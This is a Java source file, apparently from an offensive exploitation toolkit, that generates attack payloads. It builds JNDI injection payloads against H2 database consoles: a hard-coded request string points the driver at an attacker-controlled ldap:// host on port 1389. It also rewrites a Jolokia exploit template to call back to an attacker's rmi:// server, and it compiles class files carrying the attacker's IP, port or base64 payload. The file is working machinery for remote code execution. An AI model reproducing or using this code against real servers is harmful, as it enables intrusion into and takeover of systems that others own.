package src.main.LoadLib.ClassCom;

import src.main.impl.ResultCallback;

import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.Objects;

public class ClsComp {
    private String vpsIP;
    private String vpsPort;
    private String address;
    private String b64payload;
    public String text;
    public String exp = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://%s:1389/src.main.template.JNDIObject.JNDIObject&user=&password=";

    public ClsComp(String vpsIP,String vpsPort){
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }
    public ClsComp(String address,String vpsIP,String none){
        this.vpsIP = vpsIP;
        this.address = address;
    }
    public ClsComp(String b64payload){
        this.b64payload = b64payload;
    }

    // 编译class
    public boolean modifyJavaClassFile(String filename, String outfilename, ResultCallback callback) {
        try {
            String filepath = System.getProperty("user.dir") + "/src/main/template/" + filename;
            String outpath = System.getProperty("user.dir") + "/resources/" + outfilename;
            String allcontent = "";
            Path path = Paths.get(filepath);
            String content = new String(Files.readAllBytes(path));
            String filestr = Paths.get(filepath).getFileName().toString();
            String outfilestr = Paths.get(outfilename).getFileName().toString();
            if (b64payload != null && !b64payload.isEmpty()){
                allcontent = String.format(content,b64payload).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
            }else{
                allcontent = String.format(content,vpsIP,vpsPort).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
            }
            // 去掉原包中的模板文件package
            String regstr = "package src.main.template.JNDIObject;";
            String regstr1 = "package src.main.template.YAMLObject;";
            allcontent = allcontent.replaceAll(regstr,"");
            allcontent = allcontent.replaceAll(regstr1,"package artsploit;");
            Files.write(Paths.get(outpath), allcontent.getBytes());
            text = outfilestr + "文件写入成功";
            callback.onResult(text);
        } catch (IOException e) {
            text = outfilename.lastIndexOf("/") + "文件写入失败";
            callback.onResult(text);
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public boolean modifyPythonFile(String filename, String outfilename, ResultCallback callback) {
        String jolokiaUrl = address + "/jolokia";  // 替换的 jolokia URL
        String rmiUrl = String.format("rmi://%s:1389/JolokiaRealm", vpsIP);  // 替换的 rmi URL
        try {
            String filepath = System.getProperty("user.dir") + "/src/main/template/" + filename;
            String content = new String(Files.readAllBytes(Paths.get(filepath)));
            String outpath = System.getProperty("user.dir") + "/resources/" + outfilename;

            // 替换 Jolokia URL 和 RMI URL
            content = content.replace("%s/jolokia", jolokiaUrl);
            content = content.replace("rmi://%s:1389/JolokiaRealm", rmiUrl);

            Files.write(Paths.get(outpath), content.getBytes());  // 写入文件
            text = outfilename + "文件写入成功";
            callback.onResult(text);
        } catch (IOException e) {
            text = outfilename + "文件写入失败";
            callback.onResult(text);
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public void CompileJava(String filename,String outfile,ResultCallback callback) throws IOException{
        String filepath = System.getProperty("user.dir") + "/resources/" + filename + ".java";
        String outfilepath = System.getProperty("user.dir") + "/resources/" +  outfile + ".class";
        File fileToCompile = new File(filepath);

        // 获取系统编译器
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

        // 检查编译器是否可用
        if (compiler == null) {
            text = "没有可用的编译器，请确认JRE或JDK是否配置";
            callback.onResult(text);
            return;
        }

        StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
        Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjectsFromFiles(Arrays.asList(fileToCompile));
        Iterable<String> options = Arrays.asList("-source", "1.5", "-target", "1.5","-Xlint:-options");
        JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, null, options, null, compilationUnits);
        boolean success = task.call();
        try {
            fileManager.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (success) {
            text = outfile + "文件编译成功";
            callback.onResult(text);
            File compiledFile = new File(outfilepath);
            // 移动文件到指定路径
            try {
                Path sourcePath = compiledFile.toPath();
                Path targetPath = new File(outfilepath).toPath();
                Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
                text = "class文件移动到resources下";
                callback.onResult(text);
            } catch (IOException e) {
                text = "移动文件失败";
                callback.onResult(text);
                e.printStackTrace();
            }
        } else {
            text = "文件编译失败";
            callback.onResult(text);
        }
    }
}